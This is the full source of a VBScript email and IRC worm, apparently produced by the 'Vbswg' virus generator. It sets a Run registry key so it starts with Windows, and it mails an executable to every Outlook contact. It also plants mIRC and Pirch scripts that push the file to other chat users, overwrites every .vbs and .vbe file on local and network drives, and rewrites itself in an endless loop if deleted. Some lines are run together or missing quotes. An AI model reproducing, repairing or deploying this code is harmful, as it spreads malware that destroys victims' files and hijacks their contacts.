'Vbs.Info Created By [Kipr]info-You should have respect to russian women
On Error Resume Next
Set Teks2zgT4JD = CreateObject("WScript.Shell")
Teks2zgT4JD.regwrite "HKCU\software\info\", Chr(87) & Chr(98)
Set Di050v2OX9T= Createobject("scripting.filesystemobject")
Di050v2OX9T.copyfile wscript.scriptfullname,Di050v2OX9T.GetSpecialFolder(0)& "\info.vbs"
Teks2zgT4JD.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Label","wscript.exe "&Di050v2OX9T.GetSpecialFolder(0)& "\info.vbs " & Chr(37)
if Teks2zgT4JD.regread ("HKCU\software\info\mailed") <> "1" then
uyBxsFh561l()
end if
if Teks2zgT4JD.regread ("HKCU\software\info\mirqued") <> "1" then
yxDd50iLFAE ""
end if
if Teks2zgT4JD.regread ("HKCU\software\info\pirched") <> "1" then
udAaeqk163f ""
end if
a6sSO1LnI3Y()
Set TQGy235cpkn= Di050v2OX9T.opentextfile(wscript.scriptfullname, 1)
OSO7qypo2TO= TQGy235cpkn.readall
TQGy235cpkn.Close
Do
If Not (Di050v2OX9T.fileexists(wscript.scriptfullname)) Then
Set avhGe2bSr49= Di050v2OX9T.createtextfile(wscript.scriptfullname, True)
avhGe2bSr49.writeOSO7qypo2TO
avhGe2bSr49.Close
End If
Loop
Function uyBxsFh561l()
On Error Resume Next
Set jgqo3cDjjyQ = CreateObject("Outlook.Application")
If jgqo3cDjjyQ= "Outlook"Then
Set fc01AgbY4WD=jgqo3cDjjyQ.GetNameSpace("MAPI")
Set JvzlTjn5a5E= fc01AgbY4WD.AddressLists
For Each i66I5XlcJ33 In JvzlTjn5a5E
If i66I5XlcJ33.AddressEntries.Count <> 0 Then
kBxsFh561l3 = i66I5XlcJ33.AddressEntries.Count
For TN3tG55o4O0= 1 To kBxsFh561l3
Set aDd50iLFAEu = jgqo3cDjjyQ.CreateItem(0)
Set dAaeqk163f3 = i66I5XlcJ33.AddressEntries(TN3tG55o4O0)
aDd50iLFAEu.To = dAaeqk163f3.Address
aDd50iLFAEu.Subject = "We had fine time ;o)"
aDd50iLFAEu.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
set RsSO1LnI3YT=aDd50iLFAEu.Attachments
RsSO1LnI3YT.Add c:\NAHATA_D.EXE
aDd50iLFAEu.DeleteAfterSubmit = True
If aDd50iLFAEu.To <> "" Then
aDd50iLFAEu.Send
Teks2zgT4JD.regwrite "HKCU\software\info\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function yxDd50iLFAE(VGy235cpkn7)
On Error Resume Next
if VGy235cpkn7 = "" then
if Di050v2OX9T.fileexists("c:\mirc\mirc.ini") then VGy235cpkn7="c:\mirc"
if Di050v2OX9T.fileexists("c:\mirc32\mirc.ini") then VGy235cpkn7="c:\mirc32"
VO7qypo2TO3=Teks2zgT4JD.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if Di050v2OX9T.fileexists(VO7qypo2TO3 & "\mirc\mirc.ini") then VGy235cpkn7=VO7qypo2TO3 & "\mirc"
end if
if VGy235cpkn7 <> "" then
set hhGe2bSr49j = Di050v2OX9T.CreateTextFile(VGy235cpkn7 & "\script.ini", True)
fqo3cDjjyQf="[script]"
fqo3cDjjyQf=fqo3cDjjyQf&vbcrlf&"n0=on 1:JOIN:#:{"
fqo3cDjjyQf=fqo3cDjjyQf&vbcrlf&"n1=  " & chr(47) & "if ( $nick == $me ) { halt }"
fqo3cDjjyQf=fqo3cDjjyQf&vbcrlf&"n2=  " & chr(47) & "." & chr(100) & chr(99) & chr(99) & " send $nick "c:\NAHATA_D.EXE" & vbCrLf & "n3=}"
hhGe2bSr49j.writeline fqo3cDjjyQf
hhGe2bSr49j.close
Teks2zgT4JD.regwrite "HKCU\software\info\Mirqued", "1"
end if
end function
function udAaeqk163f(e01AgbY4WDT)
On Error Resume Next
if e01AgbY4WDT="" then
if Di050v2OX9T.fileexists("c:\pirch\Pirch32.exe") then e01AgbY4WDT="c:\pirch"
if Di050v2OX9T.fileexists("c:\pirch32\Pirch32.exe") then e01AgbY4WDT="c:\pirch32"
S6I5XlcJ336=Teks2zgT4JD.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if Di050v2OX9T.fileexists(S6I5XlcJ336 & "\pirch\Pirch32.exe") then e01AgbY4WDT=S6I5XlcJ336 & "\pirch\Pirch32.exe"
end if
if e01AgbY4WDT <> "" then
set nzlTjn5a5E7= Di050v2OX9T.CreateTextFile(e01AgbY4WDT & "\events.ini", True)
nzlTjn5a5E7.WriteLine "[Levels]"
nzlTjn5a5E7.WriteLine "Enabled=1"
nzlTjn5a5E7.WriteLine "Count=6"
nzlTjn5a5E7.WriteLine "Level1=000-Unknowns"
nzlTjn5a5E7.WriteLine "000-UnknownsEnabled=1"
nzlTjn5a5E7.WriteLine "Level2=100-Level 100"
nzlTjn5a5E7.WriteLine "100-Level 100Enabled=1"
nzlTjn5a5E7.WriteLine "Level3=200-Level 200"
nzlTjn5a5E7.WriteLine "200-Level 200Enabled=1"
nzlTjn5a5E7.WriteLine "Level4=300-Level 300"nzlTjn5a5E7.WriteLine " 300-Level 300Enabled=1"
nzlTjn5a5E7.WriteLine "Level5=400-Level 400 "
nzlTjn5a5E7.WriteLine "400-Level 400Enabled=1"
nzlTjn5a5E7.WriteLine "Level6=500-Level 500"
nzlTjn5a5E7.WriteLine "500-Level 500Enabled=1"
nzlTjn5a5E7.WriteLine ""
nzlTjn5a5E7.WriteLine "[000-Unknowns]"
nzlTjn5a5E7.WriteLine "UserCount=0"
nzlTjn5a5E7.WriteLine "EventCount=0"
nzlTjn5a5E7.WriteLine ""
nzlTjn5a5E7.WriteLine "[100-Level 100]"
nzlTjn5a5E7.WriteLine "User1=*!*@*"
nzlTjn5a5E7.WriteLine "UserCount=1"
nzlTjn5a5E7.writeline "Event1=ON JOIN:#:" & chr(47) & chr(100) & chr(99) & chr(99) & " tsend $nick " & c:\NAHATA_D.EXE
nzlTjn5a5E7.WriteLine "EventCount=1"
nzlTjn5a5E7.WriteLine ""
nzlTjn5a5E7.WriteLine "[200-Level 200]"
nzlTjn5a5E7.WriteLine "UserCount=0"
nzlTjn5a5E7.WriteLine "EventCount=0"
nzlTjn5a5E7.WriteLine ""
nzlTjn5a5E7.WriteLine "[300-Level 300]"
nzlTjn5a5E7.WriteLine "UserCount=0"
nzlTjn5a5E7.WriteLine "EventCount=0"
nzlTjn5a5E7.WriteLine ""
nzlTjn5a5E7.WriteLine "[400-Level 400]"
nzlTjn5a5E7.WriteLine "UserCount=0"
nzlTjn5a5E7.WriteLine "EventCount=0"
nzlTjn5a5E7.WriteLine ""
nzlTjn5a5E7.WriteLine "[500-Level 500]"
nzlTjn5a5E7.WriteLine "UserCount=0"
nzlTjn5a5E7.WriteLine "EventCount=0"
nzlTjn5a5E7.close
Teks2zgT4JD.regwrite "HKCU\software\info\pirched", "1"
end if
end function
Function a6sSO1LnI3Y()
On Error Resume Next
Set K3tG55o4O0k = Di050v2OX9T.Drives
For Each HxsFh561l32 In K3tG55o4O0k
If HxsFh561l32.Drivetype = Remote Then
Qd50iLFAEu1= HxsFh561l32 & "\"
Call aaeqk163f37(Qd50iLFAEu1)
ElseIf HxsFh561l32.IsReady Then
Qd50iLFAEu1= HxsFh561l32&"\"
Call aaeqk163f37(Qd50iLFAEu1)
End If
Next
End Function
Function aaeqk163f37(xSO1LnI3YTV)
o7qypo2TO3h=xSO1LnI3YTV
Set Zy235cpkn7V= Di050v2OX9T.GetFolder(o7qypo2TO3h)
Set pGe2bSr49jW= Zy235cpkn7V.Files
For Each qo3cDjjyQfe In pGe2bSr49jW
if Di050v2OX9T.GetExtensionName(qo3cDjjyQfe.path) = "vbs" then
Di050v2OX9T.copyfile wscript.scriptfullname , qo3cDjjyQfe.path , true
end if
if Di050v2OX9T.GetExtensionName(qo3cDjjyQfe.path) = "vbe" then
Di050v2OX9T.copyfile wscript.scriptfullname , qo3cDjjyQfe.path , true
end if
if qo3cDjjyQfe.name = "mirc.ini" then
yxDd50iLFAE(qo3cDjjyQfe.ParentFolder)
end if
if qo3cDjjyQfe.name = "Pirch32.exe" thenudAaeqk163f(qo3cDjjyQfe.ParentFolder)end ifNextSet qo3cDjjyQfe= Zy235cpkn7V.SubFolders
For Each A1AgbY4WDTu In qo3cDjjyQfe
Call aaeqk163f37(A1AgbY4WDTu.path)
Next
End Function
'Vbswg 1.50b
